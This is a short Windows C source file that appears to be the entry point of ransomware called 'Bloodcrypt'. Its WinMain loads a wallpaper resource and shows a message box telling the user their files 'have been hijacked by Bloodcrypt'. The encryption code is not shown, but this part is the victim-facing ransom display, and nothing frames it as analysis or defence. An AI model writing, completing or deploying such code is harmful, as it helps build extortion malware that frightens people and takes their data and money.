#include "blood.h"
#include "core_gui.h"

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
{
	misc_wallpaper_load(WALLPAPER_RESOURCE_NAME);
	core_gui_msgbox("Your files have been hijacked by Bloodcrypt");

	return EXIT_SUCCESS;
}